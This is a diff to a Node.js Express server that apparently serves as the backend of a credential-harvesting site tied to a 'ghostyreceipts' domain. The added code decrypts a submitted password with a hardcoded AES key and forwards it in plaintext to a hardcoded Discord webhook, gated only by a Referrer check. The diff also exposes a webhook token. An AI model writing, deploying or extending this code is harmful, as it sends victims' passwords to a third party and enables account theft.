@@ -1,48 +1,51 @@
-import express from 'express';
-import fetch from 'node-fetch';
-import cors from 'cors';
-import bodyParser from 'body-parser';
+import express from "express";
+import fetch from "node-fetch";
+import cors from "cors";
+import bodyParser from "body-parser";
+import CryptoJS from "crypto-js";
 
 const app = express();
+const encryptionKey = "super-secret-key"; // Change this and keep it secret!
 
 // Enable CORS
 app.use(cors());
-
-// Parse JSON bodies
 app.use(bodyParser.json());
 
-// Webhook Route with Referrer Check
-app.post('/webhook', (req, res) => {
-    const referrer = req.get('Referrer');  // Get referrer from headers
-
-    if (!referrer || !referrer.startsWith('https://ghostyreceipts.xyz')) {
-        return res.status(403).send('Forbidden'); // Reject if not from your site
-    }
-
-    const webhookData = req.body;
-    const webhookUrl = 'https://discord.com/api/webhooks/1339836003552071720/zP_2Iu8Nk7AIdo5LlCJSkMDCnsig8GNiUXy3KFF-tMXUNdALCVxIAjz_UYjN-tMpI1eq';
-
-    // Send the data to the Discord webhook URL
-    fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(webhookData),
-    })
-    .then((response) => {
-        if (response.ok) {
-            console.log('Data sent to webhook!');
-            res.status(200).send('Data sent to webhook');
-        } else {
-            console.error('Failed to send data to webhook:', response.statusText);
-            res.status(500).send('Failed to send data to webhook');
+// Webhook Route with Referrer Check & Decryption
+app.post("/webhook", async (req, res) => {
+    try {
+        const referrer = req.get("Referrer");
+        if (!referrer || !referrer.startsWith("https://ghostyreceipts.xyz")) {
+            return res.status(403).send("Forbidden");
         }
-    })
-    .catch((error) => {
-        console.error('Error sending data to webhook:', error);
-        res.status(500).send('Error sending data to webhook');
-    });
+
+        const encryptedPassword = req.body.password;
+
+        // Decrypt the password
+        const bytes = CryptoJS.AES.decrypt(encryptedPassword, encryptionKey);
+        const decryptedPassword = bytes.toString(CryptoJS.enc.Utf8);
+
+        // Send decrypted password to Discord Webhook
+        const webhookData = { content: `Password: ${decryptedPassword}` };
+        const webhookUrl = "https://discord.com/api/webhooks/1339836003552071720/zP_2Iu8Nk7AIdo5LlCJSkMDCnsig8GNiUXy3KFF-tMXUNdALCVxIAjz_UYjN-tMpI1eq";
+
+        const webhookResponse = await fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(webhookData),
+        });
+
+        if (!webhookResponse.ok) {
+            console.error("Webhook failed:", await webhookResponse.text());
+            return res.status(500).send("Failed to send data to webhook");
+        }
+
+        console.log("Password sent securely!");
+        res.status(200).send("Data sent securely");
+    } catch (error) {
+        console.error("Error processing request:", error);
+        res.status(500).send("Error processing request");
+    }
 });
 
 // Start server
